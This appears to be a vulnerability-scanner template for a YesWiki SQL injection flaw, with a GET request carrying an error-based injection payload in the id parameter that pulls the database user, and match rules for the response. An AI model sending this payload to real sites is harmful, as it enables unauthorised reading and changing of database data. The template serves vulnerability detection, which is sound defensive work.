id: yeswiki-sql
brief:
    title: YesWiki <2022-07-07 - SQL Injection
    by: arafatansari
    level: critical
    about: YesWiki before 2022-07-07 contains a SQL injection vulnerability via the id parameter in the AccueiL URL. An attacker can possibly obtain sensitive information from a database, modify data, and exe...
    label:
        - yeswiki
        - sqli
        - huntr
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-'
      signs:
        - "on": word
          has:
            - c8c605999f3d8352d7bb792cf3f
          in: body
          need: all
        - "on": status
          status:
            - 200
